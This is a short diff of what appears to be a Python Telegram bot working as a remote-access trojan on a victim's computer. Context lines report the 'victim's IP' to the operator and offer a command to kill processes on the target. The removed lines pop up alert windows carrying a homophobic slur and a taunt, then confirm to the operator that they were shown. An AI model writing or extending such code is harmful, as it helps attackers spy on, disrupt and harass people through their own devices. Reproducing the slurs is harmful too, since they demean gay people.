@@ -92,11 +92,6 @@ def commands(message):
                 bot.send_message(message.chat.id,'Айпи жертвы - ' + str(ip),reply_markup=mainkeyboard)
         
         
-        
-        elif message.text == '/window':
-                pyautogui.alert("Ты пидор", "Тест", button="да")
-                pyautogui.alert("Ты гей", "Тест", button="да")
-                bot.send_message(message.chat.id,'Окна с тестом на гея созданы',reply_markup=mainkeyboard)
                 
         elif message.text == '/kill' or message.text == 'Убить приложение❌':
                 bot.send_message(message.chat.id,'Какой процесс хотите убить(steam.exe)')
